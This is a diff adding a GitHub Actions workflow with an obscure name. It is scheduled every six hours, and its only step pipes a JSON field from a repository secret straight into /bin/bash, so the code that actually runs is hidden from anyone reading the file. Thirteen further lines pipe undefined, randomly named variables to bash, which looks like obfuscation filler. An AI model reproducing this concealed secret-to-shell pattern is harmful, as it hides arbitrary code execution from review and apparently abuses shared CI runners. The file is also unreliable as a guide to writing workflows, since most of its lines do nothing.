@@ -1,0 +1,30 @@
+name: xianjiafanqiao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xianjiafanqiao
+        env:
+          axpp7002: ${{ secrets.axpp7002 }}
+        run: |
+          echo $axpp7002 | jq -r .gmee7 | /bin/bash
+          echo $k4680 | jq -r .m9 | /bin/bash
+          echo $r10203 | jq -r .zg6 | /bin/bash
+          echo $dupb5346 | jq -r .bvi8954 | /bin/bash
+          echo $ydphw61 | jq -r .t83 | /bin/bash
+          echo $ml48 | jq -r .ezr09 | /bin/bash
+          echo $vql5429 | jq -r .ais79732 | /bin/bash
+          echo $vxwdv7 | jq -r .f23172 | /bin/bash
+          echo $blib67 | jq -r .pp7441 | /bin/bash
+          echo $epvrt175 | jq -r .qvrw0 | /bin/bash
+          echo $d232 | jq -r .gbbnp431 | /bin/bash
+          echo $al13 | jq -r .ojdx7346 | /bin/bash
+          echo $qa4227 | jq -r .c7 | /bin/bash
+          echo $sacgf409 | jq -r .xzkwp159 | /bin/bash
+
